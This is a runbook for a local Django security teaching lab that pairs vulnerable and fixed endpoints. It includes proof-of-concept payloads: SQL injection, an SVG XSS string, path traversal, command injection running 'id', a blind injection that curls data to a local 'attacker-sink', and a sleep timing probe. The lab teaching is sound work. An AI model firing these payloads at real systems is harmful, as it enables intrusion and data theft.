# Django Security Lab Runbook

## Part 1: Django Safety Rails

### Setup

Install dependencies:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
python manage.py migrate
python manage.py seed_demo_data
python manage.py runserver
```

Open `http://127.0.0.1:8000/part1/`.

### SQL Injection

Safe ORM search: `http://127.0.0.1:8000/part1/sql/safe/?q=public`

Vulnerable raw SQL search: `http://127.0.0.1:8000/part1/sql/vulnerable/?q=public`

PoC: `http://127.0.0.1:8000/part1/sql/vulnerable/?q=%27%20OR%201%3D1%20--`

Fixed parameterized search: `http://127.0.0.1:8000/part1/sql/fixed/?q=%27%20OR%201%3D1%20--`

> Keep user input as data, not query code.

### XSS

Upload a report at `http://127.0.0.1:8000/part1/xss/upload/`, then preview it:

- Vulnerable: `http://127.0.0.1:8000/part1/xss/preview/?name=welcome.svg`
- Fixed: `http://127.0.0.1:8000/part1/xss/preview/fixed/?name=welcome.svg`

Upload a malicious SVG such as `<svg onload=alert(1)>` to demonstrate the difference.

> User content should render as content, not code.

### CSRF

- Protected form: `http://127.0.0.1:8000/part1/csrf/safe/`
- Vulnerable endpoint: `http://127.0.0.1:8000/part1/csrf/vulnerable/`
- Attack page: `http://127.0.0.1:8000/part1/csrf/attack-page/`
- Fixed form: `http://127.0.0.1:8000/part1/csrf/fixed/`

> A logged-in browser is not proof that the user intentionally made the request.

### CORS Clarification

CORS controls who can read responses in the browser; CSRF controls whether state-changing requests require user intent.

### Clickjacking

Protected page: `http://127.0.0.1:8000/part1/clickjacking/protected/`

```bash
curl -sS -i 'http://127.0.0.1:8000/part1/clickjacking/protected/' | grep -i '^X-Frame-Options:'
```

> Some attacks trick the user into clicking the real app through a malicious frame.

### Open Redirect

- Vulnerable: `http://127.0.0.1:8000/part1/redirect/vulnerable/?next=https://example.com`
- Fixed: `http://127.0.0.1:8000/part1/redirect/fixed/?next=https://example.com`

> The user can request where to go next, but the server must decide whether that destination is allowed.

### Deployment Security Settings

Django has settings for browser and transport protections, but they only work when deployment matches the assumptions.

### IDOR Bridge

Reference page: `http://127.0.0.1:8000/part1/idor/reference/`

> Authentication answers "who are you?" Authorization answers "should you access this specific object?"

## Part 2: Integration Mistakes

### Setup

Use the Part 1 environment and open `http://127.0.0.1:8000/part2/integration/`.

### Path Traversal / Unsafe File Access

- Normal: `http://127.0.0.1:8000/part2/files/vulnerable/?name=alice-summary.txt`
- PoC: `http://127.0.0.1:8000/part2/files/vulnerable/?name=../private/internal-note.txt`
- Fixed: `http://127.0.0.1:8000/part2/files/fixed/?report=alice-summary`

> Users choose resources, not filesystem paths.

### Unsafe Subprocess Usage

- Normal: `http://127.0.0.1:8000/part2/subprocess/vulnerable/?target=api`
- PoC: `http://127.0.0.1:8000/part2/subprocess/vulnerable/?target=api%3B%20id%20%23`
- Fixed: `http://127.0.0.1:8000/part2/subprocess/fixed/?target=api%3B%20id%20%23`

> Treat command execution as a privilege boundary.

Blind callback PoC:

```text
http://127.0.0.1:8000/part2/subprocess/blind/?target=api%3B%20curl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fpart2%2Fwebhooks%2Fattacker-sink%2F%3Fsource%3Dblind-rce%5C%26leak%3Ddemo%20%23
```

View received webhook events at `http://127.0.0.1:8000/part2/webhooks/events/`.

Blind timing PoC:

```bash
time curl -sS 'http://127.0.0.1:8000/part2/subprocess/blind/?target=api%3B%20sleep%202%20%23'
```

Show visible output, then the callback, then the timing side channel.

### Unsafe Outbound Fetch / Webhook Validation

- Normal: `http://127.0.0.1:8000/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/public-api/`
- PoC: `http://127.0.0.1:8000/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/`
- Fixed: `http://127.0.0.1:8000/part2/fetch/fixed/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/`

> A URL fetch is network delegation, not just input validation.

### Unsafe Background Job / Task Parameters

- Normal: `http://127.0.0.1:8000/part2/tasks/vulnerable/?action=export&document_id=1`
- PoC: `http://127.0.0.1:8000/part2/tasks/vulnerable/?action=email_owner&document_id=2`
- Fixed: `http://127.0.0.1:8000/part2/tasks/fixed/?action=email_owner`

> Background work still needs authorization-aware inputs.

### Unsafe Privileged Integration

- Normal: `http://127.0.0.1:8000/part2/privileged/vulnerable/?user=alice&target_user=alice&action=restart`
- PoC: `http://127.0.0.1:8000/part2/privileged/vulnerable/?user=alice&target_user=bob&action=snapshot`
- Fixed: `http://127.0.0.1:8000/part2/privileged/fixed/?user=alice&action=snapshot`

> Do not let users freely steer privileged backend integrations.
